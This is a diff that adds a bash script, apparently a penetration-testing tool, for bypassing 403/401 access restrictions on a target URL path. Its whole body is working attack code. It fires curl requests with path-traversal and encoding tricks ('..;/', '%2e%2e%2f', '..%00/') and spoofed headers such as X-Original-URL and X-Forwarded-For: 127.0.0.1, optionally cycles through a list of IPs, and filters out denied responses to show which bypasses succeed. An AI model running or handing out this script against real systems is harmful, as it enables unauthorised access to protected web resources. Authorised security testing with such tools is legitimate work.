@@ -1,0 +1,144 @@
+#!/bin/bash
+echo 'URL PATH/ IPLIST(OPT)'
+bypasser () {
+    # normal responses
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
+    echo "  --> ${1}/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/
+    echo "  --> ${1}/${2}/"
+        
+    # endpoint tests
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
+    echo "  --> ${1}/${2}.json"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2??"
+    echo "  --> ${1}/${2}??"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2&"
+    echo "  --> ${1}/${2}&"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2#"
+    echo "  --> ${1}/${2}#"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%"
+    echo "  --> ${1}/${2}%"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%3f"
+    echo "  --> ${1}/${2}%3f"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%26"
+    echo "  --> ${1}/${2}%26"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%23"
+    echo "  --> ${1}/${2}%23"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
+    echo "  --> ${1}/${2}%20"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
+    echo "  --> ${1}/${2}%09"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?"
+    echo "  --> ${1}/${2}?"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
+    echo "  --> ${1}/${2}.html"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2?param"
+    echo "  --> ${1}/${2}?param"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
+    echo "  --> ${1}/${2}#"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
+    echo "  --> ${1}/${2}/."
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
+    echo "  --> ${1}/${2}..;/"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2../"
+    echo "  --> ${1}/${2}../"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%2f"
+    echo "  --> ${1}/${2}..%2f"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;//"
+    echo "  --> ${1}/${2}..;//"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2.././"
+    echo "  --> ${1}/${2}.././"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%00/"
+    echo "  --> ${1}/${2}..%00/"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%0d/"
+    echo "  --> ${1}/${2}..%0d/"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%5c"
+    echo "  --> ${1}/${2}..%5c"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..%ff/"
+    echo "  --> ${1}/${2}..%ff/"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2%2e%2e%2f"
+    echo "  --> ${1}/${2}%2e%2e%2f"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2.%2e/"
+    echo "  --> ${1}/${2}.%2e/"
+
+    # directory tests
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..;/$2"
+    echo "  --> ${1}/..;/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/../$2"
+    echo "  --> ${1}/../${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..%2f$2"
+    echo "  --> ${1}/..%2f${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..;//$2/"
+    echo "  --> ${1}/..;//${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/.././$2"
+    echo "  --> ${1}/.././${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..%00/$2"
+    echo "  --> ${1}/..%00/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..%0d/$2"
+    echo "  --> ${1}/..%0d/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..%5c$2"
+    echo "  --> ${1}/..%5c${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/..%ff/$2"
+    echo "  --> ${1}/..%ff/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/%2e%2e%2f$2"
+    echo "  --> ${1}/%2e%2e%2f${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/.%2e/$2"
+    echo "  --> ${1}/.%2e/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
+    echo "  --> ${1}/%2e/${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
+    echo "  --> ${1}/./${2}/./"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
+    echo "  --> ${1}//${2}//"
+        
+    # headers test
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: $1/$2" $1/$2
+    echo "  --> ${1}/${2} -H Referer: $1/$2"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /$2" $1/$2
+    echo "  --> ${1}/${2} -H X-Original-URL: /${2}"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: localhost" $1/$2
+    echo "  --> ${1}/${2} -H X-Forwarded-For: localhost"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 0.0.0.0" $1/$2
+    echo "  --> ${1}/${2} -H X-Forwarded-For: 0.0.0.0"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+    echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Originating-IP: 127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Client-IP: 127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1" $1/$2
+    echo "  --> ${1}/${2} -H X-Remote-Addr: 127.0.0.1"
+    curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: /$2" $1
+    echo "  --> ${1} -H X-Rewrite-URL: /${2}"
+
+    # IP test
+    if [ -z "$3" ];
+    then
+        echo 'No Input File. Ending.'
+    else
+        while read -r line
+        do
+        curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: "$line"" $1/$2
+            echo "  --> ${1}/${2} -H X-Forwarded-For: "$line""
+            curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: "$line"" $1/$2
+            echo "  --> ${1}/${2} -H X-Originating-IP: "$line""
+            curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: "$line"" $1/$2
+            echo "  --> ${1}/${2} -H X-Forwarded-Host: "$line""
+            curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: "$line"" $1/$2
+            echo "  --> ${1}/${2} -H X-Client-IP: "$line""
+            curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: "$line"" $1/$2
+            echo "  --> ${1}/${2} -H X-Remote-Addr: "$line""
+        done < $3
+    fi
+}
+
+
+bypasser $1 $2 $3 | grep -vE '403|401|404|400'
